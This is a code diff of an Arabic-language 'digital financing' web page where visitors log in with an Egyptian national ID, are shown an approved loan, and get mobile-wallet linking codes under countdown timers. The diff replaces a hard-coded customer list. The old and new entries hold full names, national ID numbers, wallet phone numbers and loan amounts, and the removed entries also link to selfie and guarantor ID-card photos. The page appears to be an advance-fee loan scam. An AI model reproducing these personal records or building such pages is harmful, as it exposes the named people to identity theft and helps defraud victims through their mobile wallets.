@@ -97,7 +97,7 @@
         <p style="margin-bottom: 1.5rem;">النظام الذهبي للتمويل الرقمي</p>
         <div class="input-group">
             <label>📇 الرقم القومي (14 رقم)</label>
-            <input type="text" id="nationalId" placeholder="مثال: 28611092200072" maxlength="14" inputmode="numeric">
+            <input type="text" id="nationalId" placeholder="مثال: 28911120201491" maxlength="14" inputmode="numeric">
         </div>
         <div id="loginError" class="error-msg"></div>
         <button class="btn-gold" onclick="handleLogin()" style="width:100%">🔐 دخول آمن</button>
@@ -117,7 +117,7 @@
             <h2 class="gold-text" style="font-size: 2rem; margin-bottom: 0.5rem;">مرحباً <span id="customerName">...</span></h2>
             <div style="display: flex; align-items: center; gap: 0.5rem; color: #4ade80;"><i class="fas fa-check-circle"></i><span>✅ تم التحقق من هويتك</span></div>
         </div>
-        <div id="customerImagesSection" style="display: none; margin-bottom: 2rem;"></div>
+        <!-- تم إزالة قسم عرض الصور بالكامل -->
         <div id="normalDashboardContent" class="normal-dashboard-content">
             <div class="hero-section">
                 <div class="hero-video"><video controls width="100%"><source src="https://d2xsxph8kpxj0f.cloudfront.net/310519663383374789/ZJ8unChtzfopWU9AxQ6boN/eid_al-ftar_flash_cash_667ae5d1.mp4" type="video/mp4">متصفحك لا يدعم تشغيل الفيديو</video></div>
@@ -191,13 +191,18 @@
         return loanDetailsMap[closest] || { months: 12, installment: 0 };
     }
 
+    // قاعدة العملاء الجديدة (تم استبدالها بالكامل من ملف الاستمارة + العملاء الإضافيين)
     const customers = [
-        { name: "محمود علي صالح خليل", id: "286112200072", wallet: "01034272143", type: "فودافون", loan: 160000, step: 40000, customerImage: "https://i.ibb.co/RGgV4Lr5/taken-picture-1-Rw9-Wyq-D-Pz-PBR-3383867.jpg", guarantorImage: "https://i.ibb.co/3rPFzSm5/inbound2464373295780695017.jpg" },
-        { name: "محمد ناصر محمد السيد", id: "291012610254", wallet: "01017562770", type: "فودافون", loan: 30000, step: 7500, customerImage: "https://i.ibb.co/KzjPNzV7/taken-picture-1-Rw9-Wyq-D-7x-Ajj-3383867.jpg", guarantorImage: "https://i.ibb.co/Y7dFRBGs/Screenshot-2026-04-11-15-40-49-58-40deb401b9ffe8e1df2f1cc5ba480b12.jpg" },
-        { name: "محمد احمد محمود احمد", id: "28910102102195", wallet: "01122107980", type: "اتصالات", loan: 30000, step: 7500, customerImage: "https://i.ibb.co/NgGVGTpn/creation-1492212505626512.jpg", guarantorImage: "https://i.ibb.co/YCQq29vg/inbound35843345129098677.jpg" },
-        { name: "محمد احمد خلف الله عمر", id: "29401172600151", wallet: "01129793519", type: "اتصالات", loan: 30000, step: 7500, customerImage: "https://i.ibb.co/nzF8JVDw/taken-picture-1Rw9Wyq-D-Uxp-Oo-3383867.jpg", guarantorImage: "" },
-        { name: "عبدالرحمن كمال معوض امبابى", id: "29802072200066", wallet: "01101353222", type: "اتصالات", loan: 200000, step: 50000, customerImage: "https://i.ibb.co/7Pjzt573/taken-picture-1Rw9Wyq-D-vyz-Hs-3383867.jpg", guarantorImage: "https://i.ibb.co/zvwqk2TZ/17757683811995630753632338854268.jpg" },
-        { name: "علاء عبدالحكيم محمد درويش", id: "29410011617371", wallet: "01027250679", type: "فودافون", loan: 40000, step: 10000, customerImage: "https://i.ibb.co/spgFpvsp/creation-1400306871900038.jpg", guarantorImage: "" }
+        { name: "احمد ابراهيم عبدالعاطي", id: "28911120201491", wallet: "", type: "", loan: 200000, step: 50000 },
+        { name: "سامح محمد احمد حسن", id: "27702122102315", wallet: "01151686300", type: "اتصالات", loan: 200000, step: 50000 },
+        { name: "محمد جمال احمد احمد", id: "28910011904914", wallet: "01017550748", type: "فودافون", loan: 50000, step: 12500 },
+        { name: "محمد مصطفى عيد عبده", id: "28010260105052", wallet: "01111042022", type: "اتصالات", loan: 40000, step: 10000 },
+        { name: "محمد ابراهيم السيد الحمزاوي", id: "27004091400372", wallet: "01097564831", type: "فودافون", loan: 200000, step: 50000 },
+        { name: "حسين محمد حسين سليمان", id: "28501210104776", wallet: "01092420593", type: "فودافون", loan: 155000, step: 38750 },
+        { name: "احمد عبدالله محمد عبدالهادى", id: "29510301600591", wallet: "01095514885", type: "فودافون", loan: 30000, step: 7500 },
+        { name: "عبدالحميد محمد عبدالحميد موسي", id: "29407310101011", wallet: "01128657468", type: "اتصالات", loan: 35000, step: 8750 },
+        { name: "إسلام ياسر أحمد محمد", id: "29607161400212", wallet: "01115088793", type: "اتصالات", loan: 40000, step: 10000 },
+        { name: "صباح مسعد منصور ابراهيم", id: "27305070101243", wallet: "01148246521", type: "اتصالات", loan: 40000, step: 10000 }
     ];
 
     let currentCustomer = null;
@@ -251,29 +256,21 @@
         document.getElementById('loanDuration').innerText = months + ' شهر';
         document.getElementById('firstPaymentDate').innerText = formattedDate;
 
-        const imagesDiv = document.getElementById('customerImagesSection');
-        if (customer.customerImage || customer.guarantorImage) {
-            imagesDiv.style.display = 'block';
-            let imagesHtml = '<div class="image-row">';
-            if (customer.customerImage) imagesHtml += `<div class="image-card"><img src="${customer.customerImage}" class="glow-image" style="max-width:100%; border-radius:15px;" onerror="this.parentElement.style.display='none'"><p>📸 صورة تأكيد الهوية (سيلفي العميل)</p></div>`;
-            if (customer.guarantorImage) imagesHtml += `<div class="image-card"><img src="${customer.guarantorImage}" class="glow-image" style="max-width:100%; border-radius:15px;" onerror="this.parentElement.style.display='none'"><p>🪪 صورة بطاقة الضامن</p></div>`;
-            imagesHtml += '</div>'; imagesDiv.innerHTML = imagesHtml;
-        } else { imagesDiv.style.display = 'none'; imagesDiv.innerHTML = ''; }
+        // تم حذف عرض الصور تمامًا
 
-        const hasWallet = customer.type && customer.wallet && customer.wallet !== '.' && customer.wallet !== null;
+        const hasWallet = customer.type && customer.wallet && customer.wallet !== '.' && customer.wallet !== null && customer.wallet !== "";
         const normalDiv = document.getElementById('normalDashboardContent'), walletRequiredDiv = document.getElementById('walletRequiredContent');
         if (hasWallet) {
             normalDiv.style.display = 'block'; walletRequiredDiv.style.display = 'none';
             document.getElementById('linkingSection').classList.add('active');
-            showLinkingInstructions(customer.type); startTimer(); startAutoRedirect();
+            showLinkingInstructions(customer.type, customer.step); startTimer(); startAutoRedirect();
         } else {
             normalDiv.style.display = 'none'; walletRequiredDiv.style.display = 'block';
             startWalletDeadline(); if (timerInterval) clearInterval(timerInterval); if (autoRedirectTimer) clearTimeout(autoRedirectTimer); if (autoRedirectInterval) clearInterval(autoRedirectInterval);
         }
     }
-    function showLinkingInstructions(walletType) {
+    function showLinkingInstructions(walletType, stepAmount) {
         const instructionBox = document.getElementById('instructionBox');
-        const stepAmount = currentCustomer.step;
         let code = '', walletName = '';
         if (walletType === 'فودافون') { code = '#100*9*'; walletName = 'فودافون كاش'; }
         else if (walletType === 'اتصالات') { code = '#6*777*'; walletName = 'اتصالات كاش'; }
